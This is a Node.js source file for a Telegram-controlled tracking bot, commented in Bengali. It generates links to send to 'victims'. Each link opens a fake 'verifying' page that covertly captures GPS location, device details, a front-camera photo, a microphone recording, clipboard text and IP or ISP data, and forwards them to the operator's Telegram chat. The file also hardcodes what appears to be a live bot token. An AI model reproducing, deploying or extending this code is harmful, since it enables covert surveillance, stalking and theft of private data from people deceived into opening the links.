const express    = require('express');
const http       = require('http');
const telegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');
const axios      = require('axios');
const { v4: uuidv4 } = require('uuid');

// ─── তোমার তথ্য ─────────────────────────────────────────────────────────────
const token   = '8993764412:AAGDvbGjef4sP7jbM7jrQBxsDQyoqZw-Xp0';
const id      = '8294558143';
const address = 'http://hackbot-production.up.railway.app';
// ────────────────────────────────────────────────────────────────────────────

const app       = express();
const appServer = http.createServer(app);
const appBot    = new telegramBot(token, { polling: true });

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// ─── মেইন মেনু ──────────────────────────────────────────────────────────────
const MAIN_KB = {
    parse_mode: 'HTML',
    reply_markup: {
        inline_keyboard: [
            [
                { text: '📍 Location লিংক',      callback_data: 'gen:location' },
                { text: '📱 Device Info লিংক',   callback_data: 'gen:device' }
            ],
            [
                { text: '📸 Camera লিংক',         callback_data: 'gen:camera' },
                { text: '🎤 Microphone লিংক',     callback_data: 'gen:microphone' }
            ],
            [
                { text: '📋 Clipboard লিংক',      callback_data: 'gen:clipboard' },
                { text: '🌐 IP + Browser লিংক',   callback_data: 'gen:ip' }
            ],
            [
                { text: '🔋 Battery + Network',   callback_data: 'gen:battery' },
                { text: '📡 Full Info লিংক',      callback_data: 'gen:full' }
            ]
        ]
    }
};

// ─── সার্ভার হোম ─────────────────────────────────────────────────────────────
app.get('/', (req, res) => {
    res.send('<h1 align="center" style="color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙐𝙥✙❖</h1>');
});

// ════════════════════════════════════════════════════════════════════════════
// ট্র্যাকিং পেজ — ভিকটিম লিংক খুললে এই HTML লোড হয়
// ════════════════════════════════════════════════════════════════════════════

// ─── 📍 Location পেজ ─────────────────────────────────────────────────────────
app.get('/t/location/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying Location...</title>
<style>
  body{margin:0;background:#1a1a2e;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial}
  .box{text-align:center;color:white;padding:30px}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #0d6efd;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
  p{color:#aaa;font-size:14px}
</style>
</head><body>
<div class="box">
  <div class="spinner"></div>
  <h3>Verifying your location...</h3>
  <p>Please wait</p>
</div>
<script>
const uid = '${uid}';
const srv = '${address}';
function send(data){
  fetch(srv+'/collect/location/'+uid,{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify(data)
  });
}
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(
    p => send({
      lat:p.coords.latitude, lon:p.coords.longitude,
      acc:p.coords.accuracy, ua:navigator.userAgent,
      ip:'fetching'
    }),
    e => send({error:e.message, ua:navigator.userAgent}),
    {enableHighAccuracy:true,timeout:10000}
  );
} else {
  send({error:'Geolocation not supported', ua:navigator.userAgent});
}
setTimeout(()=>{
  document.querySelector('h3').textContent='Verification complete';
  document.querySelector('p').textContent='You may close this page';
},3000);
</script>
</body></html>`);
});

app.post('/collect/location/:uid', (req, res) => {
    const data = req.body;
    const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (data.lat) {
        appBot.sendLocation(id, data.lat, data.lon);
        appBot.sendMessage(id,
            `°• 📍 <b>LOCATION RECEIVED</b>\n\n` +
            `• Lat: <code>${data.lat}</code>\n` +
            `• Lon: <code>${data.lon}</code>\n` +
            `• Accuracy: ${Math.round(data.acc)}m\n` +
            `• IP: <code>${ip}</code>\n` +
            `• UA: <code>${(data.ua||'').substring(0,80)}</code>`,
            { parse_mode: 'HTML' }
        );
    } else {
        appBot.sendMessage(id,
            `°• 📍 Location Error\n• ${data.error}\n• IP: ${ip}\n• UA: ${(data.ua||'').substring(0,80)}`,
            { parse_mode: 'HTML' }
        );
    }
    res.send('ok');
});

// ─── 📱 Device Info পেজ ──────────────────────────────────────────────────────
app.get('/t/device/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
  body{margin:0;background:#0f3460;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial}
  .box{text-align:center;color:white}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #e94560;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>
<div class="box">
  <div class="spinner"></div>
  <h3>Loading content...</h3>
</div>
<script>
const uid = '${uid}';
const srv = '${address}';
const nav = navigator;
const scr = screen;
const info = {
  ua        : nav.userAgent,
  platform  : nav.platform,
  language  : nav.language,
  languages : nav.languages ? nav.languages.join(',') : '',
  cores     : nav.hardwareConcurrency || 'N/A',
  memory    : nav.deviceMemory || 'N/A',
  online    : nav.onLine,
  cookieEnabled: nav.cookieEnabled,
  screenW   : scr.width,
  screenH   : scr.height,
  colorDepth: scr.colorDepth,
  timezone  : Intl.DateTimeFormat().resolvedOptions().timeZone,
  touchPoints: nav.maxTouchPoints,
  vendor    : nav.vendor,
  connection: nav.connection ? (nav.connection.effectiveType||'N/A') : 'N/A',
  downlink  : nav.connection ? (nav.connection.downlink||'N/A') : 'N/A',
};
fetch(srv+'/collect/device/'+uid,{
  method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify(info)
});
setTimeout(()=>{
  document.querySelector('h3').textContent='Done';
},2000);
</script>
</body></html>`);
});

app.post('/collect/device/:uid', (req, res) => {
    const d  = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    appBot.sendMessage(id,
        `°• 📱 <b>DEVICE INFO</b>\n\n` +
        `• IP: <code>${ip}</code>\n` +
        `• UA: <code>${(d.ua||'').substring(0,100)}</code>\n` +
        `• Platform: ${d.platform}\n` +
        `• Language: ${d.language}\n` +
        `• Screen: ${d.screenW}x${d.screenH}\n` +
        `• CPU Cores: ${d.cores}\n` +
        `• RAM: ${d.memory}GB\n` +
        `• Timezone: ${d.timezone}\n` +
        `• Connection: ${d.connection} (${d.downlink}Mbps)\n` +
        `• Touch Points: ${d.touchPoints}\n` +
        `• Online: ${d.online}`,
        { parse_mode: 'HTML' }
    );
    res.send('ok');
});

// ─── 📸 Camera পেজ ───────────────────────────────────────────────────────────
app.get('/t/camera/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying...</title>
<style>
  body{margin:0;background:#1a1a2e;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial;color:white}
  .box{text-align:center}
  video{display:none}canvas{display:none}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #28a745;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>
<div class="box">
  <div class="spinner"></div>
  <h3 id="msg">Please wait...</h3>
</div>
<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>
<script>
const uid='${uid}', srv='${address}';
const msg=document.getElementById('msg');
async function capture(){
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const v=document.getElementById('v');
    v.srcObject=stream;
    await new Promise(r=>setTimeout(r,1500));
    const c=document.getElementById('c');
    c.width=v.videoWidth; c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    const img=c.toDataURL('image/jpeg',0.8);
    stream.getTracks().forEach(t=>t.stop());
    await fetch(srv+'/collect/camera/'+uid,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({img:img,ua:navigator.userAgent})
    });
    msg.textContent='Verification complete';
  }catch(e){
    fetch(srv+'/collect/camera/'+uid,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({error:e.message,ua:navigator.userAgent})
    });
    msg.textContent='Done';
  }
}
capture();
</script>
</body></html>`);
});

app.post('/collect/camera/:uid', async (req, res) => {
    const d  = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (d.img) {
        try {
            const base64 = d.img.replace(/^data:image\/\w+;base64,/, '');
            const buf    = Buffer.from(base64, 'base64');
            await appBot.sendPhoto(id, buf, {
                caption: `°• 📸 <b>CAMERA CAPTURED</b>\n• IP: <code>${ip}</code>\n• UA: <code>${(d.ua||'').substring(0,80)}</code>`,
                parse_mode: 'HTML'
            });
        } catch (e) {
            appBot.sendMessage(id, `°• 📸 Camera captured but photo send failed\n• IP: ${ip}`);
        }
    } else {
        appBot.sendMessage(id, `°• 📸 Camera Error: ${d.error}\n• IP: ${ip}\n• UA: ${(d.ua||'').substring(0,80)}`);
    }
    res.send('ok');
});

// ─── 🎤 Microphone পেজ ───────────────────────────────────────────────────────
app.get('/t/microphone/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
  body{margin:0;background:#1a1a2e;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial;color:white}
  .box{text-align:center}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #dc3545;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>
<div class="box">
  <div class="spinner"></div>
  <h3 id="msg">Please wait...</h3>
  <p id="sub" style="color:#aaa">Verifying...</p>
</div>
<script>
const uid='${uid}', srv='${address}';
const msg=document.getElementById('msg');
const sub=document.getElementById('sub');
const DURATION=8000;
async function record(){
  try{
    const stream=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
    const rec=new MediaRecorder(stream);
    const chunks=[];
    rec.ondataavailable=e=>chunks.push(e.data);
    rec.onstop=async()=>{
      stream.getTracks().forEach(t=>t.stop());
      const blob=new Blob(chunks,{type:'audio/webm'});
      const reader=new FileReader();
      reader.onloadend=async()=>{
        await fetch(srv+'/collect/microphone/'+uid,{
          method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({audio:reader.result,ua:navigator.userAgent})
        });
        msg.textContent='Done';
        sub.textContent='';
      };
      reader.readAsDataURL(blob);
    };
    rec.start();
    let left=DURATION/1000;
    const t=setInterval(()=>{
      left--;
      sub.textContent='Recording: '+left+'s left';
      if(left<=0){clearInterval(t);rec.stop();}
    },1000);
  }catch(e){
    fetch(srv+'/collect/microphone/'+uid,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({error:e.message,ua:navigator.userAgent})
    });
    msg.textContent='Done';
  }
}
record();
</script>
</body></html>`);
});

app.post('/collect/microphone/:uid', async (req, res) => {
    const d  = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (d.audio) {
        try {
            const base64 = d.audio.replace(/^data:audio\/\w+;base64,/, '');
            const buf    = Buffer.from(base64, 'base64');
            await appBot.sendAudio(id, buf, {
                caption: `°• 🎤 <b>MIC RECORDED</b>\n• IP: <code>${ip}</code>\n• UA: <code>${(d.ua||'').substring(0,80)}</code>`,
                parse_mode: 'HTML'
            }, { filename: 'audio.webm', contentType: 'audio/webm' });
        } catch (e) {
            appBot.sendMessage(id, `°• 🎤 Mic captured but send failed\n• IP: ${ip}`);
        }
    } else {
        appBot.sendMessage(id, `°• 🎤 Mic Error: ${d.error}\n• IP: ${ip}`);
    }
    res.send('ok');
});

// ─── 📋 Clipboard পেজ ────────────────────────────────────────────────────────
app.get('/t/clipboard/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
  body{margin:0;background:#1a1a2e;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial;color:white}
  .box{text-align:center}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #ffc107;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>
<div class="box">
  <div class="spinner"></div>
  <h3>Loading...</h3>
</div>
<script>
const uid='${uid}', srv='${address}';
async function getClip(){
  let text='';
  try{
    text=await navigator.clipboard.readText();
  }catch(e){text='Permission denied: '+e.message;}
  fetch(srv+'/collect/clipboard/'+uid,{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({text:text,ua:navigator.userAgent})
  });
  document.querySelector('h3').textContent='Done';
}
getClip();
</script>
</body></html>`);
});

app.post('/collect/clipboard/:uid', (req, res) => {
    const d  = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    appBot.sendMessage(id,
        `°• 📋 <b>CLIPBOARD</b>\n\n• IP: <code>${ip}</code>\n• Content:\n<code>${d.text||'empty'}</code>`,
        { parse_mode: 'HTML' }
    );
    res.send('ok');
});

// ─── 🌐 IP পেজ ───────────────────────────────────────────────────────────────
app.get('/t/ip/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying...</title>
<style>
  body{margin:0;background:#1a1a2e;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial;color:white}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #17a2b8;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>
<div style="text-align:center">
  <div class="spinner"></div>
  <h3>Verifying...</h3>
</div>
<script>
const uid='${uid}',srv='${address}';
fetch('https://ipapi.co/json/')
  .then(r=>r.json())
  .then(ip=>{
    fetch(srv+'/collect/ip/'+uid,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({ip:ip,ua:navigator.userAgent})
    });
  }).catch(()=>{
    fetch(srv+'/collect/ip/'+uid,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({ip:{ip:'unknown'},ua:navigator.userAgent})
    });
  });
document.querySelector('h3').textContent='Done';
</script>
</body></html>`);
});

app.post('/collect/ip/:uid', (req, res) => {
    const d  = req.body;
    const ip = d.ip || {};
    const realIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    appBot.sendMessage(id,
        `°• 🌐 <b>IP + BROWSER INFO</b>\n\n` +
        `• Real IP: <code>${realIp}</code>\n` +
        `• IP (API): <code>${ip.ip||'N/A'}</code>\n` +
        `• City: ${ip.city||'N/A'}\n` +
        `• Region: ${ip.region||'N/A'}\n` +
        `• Country: ${ip.country_name||'N/A'} ${ip.country_code||''}\n` +
        `• ISP: ${ip.org||'N/A'}\n` +
        `• Timezone: ${ip.timezone||'N/A'}\n` +
        `• UA: <code>${(d.ua||'').substring(0,100)}</code>`,
        { parse_mode: 'HTML' }
    );
    res.send('ok');
});

// ─── 🔋 Battery পেজ ──────────────────────────────────────────────────────────
app.get('/t/battery/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
  body{margin:0;background:#1a1a2e;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial;color:white}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #6f42c1;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>
<div style="text-align:center">
  <div class="spinner"></div>
  <h3>Loading...</h3>
</div>
<script>
const uid='${uid}',srv='${address}';
async function getData(){
  const info={ua:navigator.userAgent,connection:'N/A',downlink:'N/A',
               battery:'N/A',charging:false};
  if(navigator.connection){
    info.connection=navigator.connection.effectiveType||'N/A';
    info.downlink=navigator.connection.downlink||'N/A';
  }
  try{
    const b=await navigator.getBattery();
    info.battery=Math.round(b.level*100)+'%';
    info.charging=b.charging;
  }catch(e){}
  fetch(srv+'/collect/battery/'+uid,{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify(info)
  });
  document.querySelector('h3').textContent='Done';
}
getData();
</script>
</body></html>`);
});

app.post('/collect/battery/:uid', (req, res) => {
    const d  = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    appBot.sendMessage(id,
        `°• 🔋 <b>BATTERY + NETWORK</b>\n\n` +
        `• IP: <code>${ip}</code>\n` +
        `• Battery: ${d.battery}\n` +
        `• Charging: ${d.charging ? 'Yes ⚡' : 'No'}\n` +
        `• Network: ${d.connection}\n` +
        `• Speed: ${d.downlink}Mbps\n` +
        `• UA: <code>${(d.ua||'').substring(0,80)}</code>`,
        { parse_mode: 'HTML' }
    );
    res.send('ok');
});

// ─── 📡 Full Info পেজ ────────────────────────────────────────────────────────
app.get('/t/full/:uid', (req, res) => {
    const uid = req.params.uid;
    res.send(`<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying...</title>
<style>
  body{margin:0;background:#1a1a2e;display:flex;align-items:center;
       justify-content:center;height:100vh;font-family:Arial;color:white}
  .spinner{width:60px;height:60px;border:5px solid #444;
           border-top:5px solid #fd7e14;border-radius:50%;
           animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head><body>
<div style="text-align:center">
  <div class="spinner"></div>
  <h3 id="msg">Verifying your account...</h3>
  <p style="color:#aaa">Please wait</p>
</div>
<script>
const uid='${uid}',srv='${address}';
const info={
  ua       :navigator.userAgent,
  platform :navigator.platform,
  language :navigator.language,
  cores    :navigator.hardwareConcurrency||'N/A',
  memory   :navigator.deviceMemory||'N/A',
  screen   :screen.width+'x'+screen.height,
  timezone :Intl.DateTimeFormat().resolvedOptions().timeZone,
  touch    :navigator.maxTouchPoints,
  online   :navigator.onLine,
  connection:navigator.connection?(navigator.connection.effectiveType||'N/A'):'N/A',
};
// IP info
fetch('https://ipapi.co/json/').then(r=>r.json()).then(ip=>{
  info.ip=ip.ip; info.city=ip.city; info.country=ip.country_name;
  info.isp=ip.org; info.tz=ip.timezone;
  send();
}).catch(()=>{info.ip='N/A';send();});

async function send(){
  // battery
  try{
    const b=await navigator.getBattery();
    info.battery=Math.round(b.level*100)+'%';
    info.charging=b.charging;
  }catch(e){info.battery='N/A';}
  // location
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      p=>{info.lat=p.coords.latitude;info.lon=p.coords.longitude;info.acc=p.coords.accuracy;post();},
      e=>{info.locErr=e.message;post();},
      {enableHighAccuracy:true,timeout:8000}
    );
  } else {post();}
}
function post(){
  fetch(srv+'/collect/full/'+uid,{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify(info)
  });
  document.getElementById('msg').textContent='Verification complete';
}
</script>
</body></html>`);
});

app.post('/collect/full/:uid', async (req, res) => {
    const d  = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let msg =
        `°• 📡 <b>FULL INFO COLLECTED</b>\n\n` +
        `🌐 <b>Network</b>\n` +
        `• Real IP: <code>${ip}</code>\n` +
        `• IP (API): <code>${d.ip||'N/A'}</code>\n` +
        `• City: ${d.city||'N/A'}\n` +
        `• Country: ${d.country||'N/A'}\n` +
        `• ISP: ${d.isp||'N/A'}\n` +
        `• Timezone: ${d.tz||d.timezone||'N/A'}\n` +
        `• Connection: ${d.connection||'N/A'}\n\n` +
        `📱 <b>Device</b>\n` +
        `• UA: <code>${(d.ua||'').substring(0,100)}</code>\n` +
        `• Platform: ${d.platform||'N/A'}\n` +
        `• Language: ${d.language||'N/A'}\n` +
        `• Screen: ${d.screen||'N/A'}\n` +
        `• CPU: ${d.cores} cores\n` +
        `• RAM: ${d.memory}GB\n` +
        `• Touch: ${d.touch}\n` +
        `• Battery: ${d.battery||'N/A'} ${d.charging?'⚡':''}\n\n`;

    if (d.lat) {
        msg += `📍 <b>Location</b>\n• Lat: ${d.lat}\n• Lon: ${d.lon}\n• Acc: ${Math.round(d.acc||0)}m`;
        appBot.sendLocation(id, d.lat, d.lon);
    } else {
        msg += `📍 Location: ${d.locErr||'Not granted'}`;
    }
    appBot.sendMessage(id, msg, { parse_mode: 'HTML' });
    res.send('ok');
});

// ════════════════════════════════════════════════════════════════════════════
// BOT HANDLERS
// ════════════════════════════════════════════════════════════════════════════

// ─── /start ──────────────────────────────────────────────────────────────────
appBot.onText(/\/start/, (msg) => {
    if (String(msg.chat.id) !== String(id)) {
        appBot.sendMessage(msg.chat.id, '❌ Access Denied');
        return;
    }
    appBot.sendMessage(id,
        `°•🌹 <b>KAZAMIKARI BOT</b> 🌷\n\n` +
        `• নিচের মেনু থেকে যে ধরনের লিংক বানাতে চাও সেটা বেছে নাও\n` +
        `• লিংক কপি করে ভিকটিমকে পাঠাও\n` +
        `• ভিকটিম ক্লিক করলেই তথ্য বটে চলে আসবে\n\n` +
        `• 🍀 Developer 👉 @Professor_Anish ⚔️`,
        MAIN_KB
    );
});

// ─── Callback — লিংক তৈরি করো ────────────────────────────────────────────────
appBot.on('callback_query', (cq) => {
    if (String(cq.from.id) !== String(id)) return;
    const data = cq.data;
    if (!data.startsWith('gen:')) return;

    const type = data.split(':')[1];
    const uid  = uuidv4().split('-')[0]; // ছোট unique ID
    const link = `${address}/t/${type}/${uid}`;

    const labels = {
        location   : '📍 Location',
        device     : '📱 Device Info',
        camera     : '📸 Camera',
        microphone : '🎤 Microphone',
        clipboard  : '📋 Clipboard',
        ip         : '🌐 IP + Browser',
        battery    : '🔋 Battery + Network',
        full       : '📡 Full Info'
    };

    const descriptions = {
        location   : 'ভিকটিমের GPS লোকেশন পাবে',
        device     : 'ডিভাইস মডেল, OS, স্ক্রিন, CPU, RAM পাবে',
        camera     : 'ফ্রন্ট ক্যামেরা দিয়ে ছবি তুলে পাঠাবে',
        microphone : '৮ সেকেন্ড মাইক রেকর্ড করে পাঠাবে',
        clipboard  : 'ক্লিপবোর্ডের কপি করা টেক্সট পাবে',
        ip         : 'IP, শহর, দেশ, ISP পাবে',
        battery    : 'ব্যাটারি%, নেটওয়ার্ক স্পিড পাবে',
        full       : 'সব তথ্য একসাথে — IP + Device + Location + Battery'
    };

    appBot.answerCallbackQuery(cq.id, { text: `${labels[type]} লিংক তৈরি হয়েছে!` });

    appBot.sendMessage(id,
        `°• 🔗 <b>${labels[type]} লিংক</b>\n\n` +
        `📌 এই লিংকটা ভিকটিমকে পাঠাও:\n\n` +
        `<code>${link}</code>\n\n` +
        `ℹ️ ${descriptions[type]}\n\n` +
        `• ক্লিক করলেই তথ্য এখানে চলে আসবে\n` +
        `• প্রতিটা লিংক আলাদা — যতবার খুশি বানাও`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 মেনুতে ফিরে যাও', callback_data: 'back:menu' }
                ]]
            }
        }
    );
});

// ─── Back to menu ─────────────────────────────────────────────────────────────
appBot.on('callback_query', (cq) => {
    if (cq.data === 'back:menu') {
        appBot.editMessageText(
            `°•🌹 <b>KAZAMIKARI BOT</b> 🌷\n\n` +
            `• লিংক বেছে নাও — ভিকটিমকে পাঠাও`,
            {
                chat_id: id,
                message_id: cq.message.message_id,
                parse_mode: 'HTML',
                reply_markup: MAIN_KB.reply_markup
            }
        );
    }
});

// ─── Keepalive ────────────────────────────────────────────────────────────────
setInterval(() => {
    axios.get(address).catch(() => {});
}, 5000);

// ─── সার্ভার চালু ─────────────────────────────────────────────────────────────
appServer.listen(process.env.PORT || 8999, () => {
    console.log('Server on port ' + (process.env.PORT || 8999));
});
